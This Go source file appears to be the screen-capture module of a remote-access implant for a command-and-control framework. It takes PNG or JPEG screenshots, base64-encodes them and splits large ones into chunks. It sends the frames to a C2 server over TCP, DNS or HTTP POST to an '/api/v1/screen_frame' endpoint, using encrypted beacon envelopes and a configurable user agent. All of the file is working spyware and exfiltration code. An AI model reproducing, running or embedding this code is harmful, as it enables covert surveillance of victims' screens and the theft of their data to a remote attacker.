//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image/jpeg"
	"image/png"
	"io"
	"net/http"
	"strings"
)

func sendScreenFrame(data []byte) {
	b64 := base64.StdEncoding.EncodeToString(data)
	req := BeaconRequest{
		UUID: agentUUID,
		Results: []TaskResult{{
			Type:   "screen_frame",
			Output: b64,
		}},
	}
	body, _ := encodeBeacon(req)
	sendBody, kind, _, ok := buildBeaconEnvelope(body)
	if !ok || kind != agentFrameEncrypted {
		return
	}
	switch Protocol {
	case "tcp":
		sendTCPBeacon(sendBody)
	case "dns":
		sendDNSBeacon(sendBody)
	default:
		screenURL := C2URLs[currentC2Idx]
		if !strings.HasPrefix(screenURL, "http://") && !strings.HasPrefix(screenURL, "https://") {
			screenURL = "http://" + screenURL
		}
		httpReq, err := http.NewRequest("POST", screenURL+"/api/v1/screen_frame", bytes.NewReader(sendBody))
		if err != nil {
			return
		}
		httpReq.Header.Set("Content-Type", "application/json")
		httpReq.Header.Set("User-Agent", getActiveUserAgentFromConfig())
		resp, err := client.Do(httpReq)
		if err == nil {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
}

func takeScreenshot() ([]byte, error) {
	img, err := captureScreenRGBA()
	if err != nil {
		return nil, err
	}
	var pngBuf bytes.Buffer
	if err := png.Encode(&pngBuf, img); err != nil {
		return nil, err
	}
	return pngBuf.Bytes(), nil
}

func takeScreenshotJPEG(quality int) ([]byte, error) {
	img, err := captureScreenRGBA()
	if err != nil {
		return nil, err
	}
	var jpegBuf bytes.Buffer
	opts := &jpeg.Options{Quality: quality}
	if err := jpeg.Encode(&jpegBuf, img, opts); err != nil {
		return nil, err
	}
	return jpegBuf.Bytes(), nil
}

func takeScreenshotChunked(quality int) []TaskResult {
	imgBytes, err := takeScreenshotJPEG(quality)
	if err != nil {
		return []TaskResult{{Error: err.Error()}}
	}

	if len(imgBytes) <= 2*1024*1024 {
		return []TaskResult{{
			Type:     "screenshot",
			Output:   base64.StdEncoding.EncodeToString(imgBytes),
			Encoding: "base64",
			Size:     int64(len(imgBytes)),
		}}
	}

	chunkSize := 256 * 1024
	totalChunks := (len(imgBytes) + chunkSize - 1) / chunkSize
	var results []TaskResult

	for i := 0; i < totalChunks; i++ {
		start := i * chunkSize
		end := start + chunkSize
		if end > len(imgBytes) {
			end = len(imgBytes)
		}
		chunk := imgBytes[start:end]
		results = append(results, TaskResult{
			Type:     "screenshot_chunk",
			Output:   base64.StdEncoding.EncodeToString(chunk),
			Encoding: "base64",
			Offset:   int64(i),
			Size:     int64(totalChunks),
			Filename: fmt.Sprintf("screenshot_%d_%d.jpg", i, totalChunks),
		})
	}

	return results
}
